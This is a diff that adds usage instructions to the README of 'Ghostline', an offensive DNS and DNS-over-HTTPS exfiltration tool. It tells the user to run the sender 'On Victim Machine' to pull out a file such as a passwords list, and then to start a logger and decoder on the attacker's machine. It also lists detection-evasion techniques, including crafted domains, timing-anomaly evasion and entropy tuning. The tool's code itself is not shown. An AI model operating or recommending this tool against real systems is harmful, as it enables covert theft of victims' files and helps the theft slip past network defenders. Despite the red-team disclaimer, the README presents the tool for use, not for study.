@@ -27,3 +27,54 @@ cd Ghostline
 python3 -m venv venv
 source venv/bin/activate
 pip install -r requirements.txt
+
+
+
+🚀 Usage
+On Victim Machine:
+Exfiltrate a file:
+
+```bash
+python3 Ghostline.py
+Enter the path to the target file (e.g., /home/user/passwords.txt)
+
+On Attacker Machine:
+Start Passive Logger
+
+python3 receiver/passive_logger.py
+Reconstruct Received Data
+
+python3 -m receiver.decoder
+Output will be saved to:
+
+receiver/reconstructed_output.bin
+📁 Project Structure
+Ghostline/
+├── encoder/              # Payload encoding & XOR logic
+├── dns_sender/           # Chunk sender with DNS/DoH logic
+├── receiver/             # Passive receiver & decoder
+├── utils/                # Timing & entropy helpers
+├── config/               # Config file (chunk size, DoH toggle, etc.)
+├── logs/                 # Sent chunks stored here
+├── Ghostline.py          # Main CLI entry point
+🧠 Research-Based Design
+Ghostline is based on insights from 9 advanced papers on DNS exfiltration and detection. Techniques used:
+
+GAN-based domain crafting (DOLOS)
+
+FFT & DTW for timing anomaly evasion
+
+Entropy tuning for lexical models
+
+DoH tunneling evasion via flow masking
+
+Mimicry of subdomains based on CDN & human typos
+
+⚠️ Disclaimer
+Ghostline is strictly intended for educational, research, and authorized Red Team use only. Misuse of this tool can result in criminal charges. Use responsibly.
+
+✨ Author
+Made with ❤️ by Anshool Dahale
+
+🔗 ph : 8328004134
+📧 anshooldahale08@gmail.com
